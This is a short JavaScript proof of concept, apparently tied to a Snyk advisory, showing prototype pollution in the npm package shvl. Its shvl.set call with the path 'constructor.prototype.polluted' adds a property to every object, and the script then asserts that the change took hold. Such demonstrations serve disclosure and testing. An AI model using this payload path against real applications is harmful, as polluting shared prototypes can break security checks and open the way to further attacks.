//https://snyk.io/vuln/SNYK-JS-SHVL-1085284

var shvl = require("shvl")
const assert = require('assert');

let obj = {}
console.log("Before: " + {}.polluted)
shvl.set(obj, 'constructor.prototype.polluted', 'yes')

console.log("After: " + {}.polluted)
assert({}.polluted == "yes");
console.log("Payload success!")

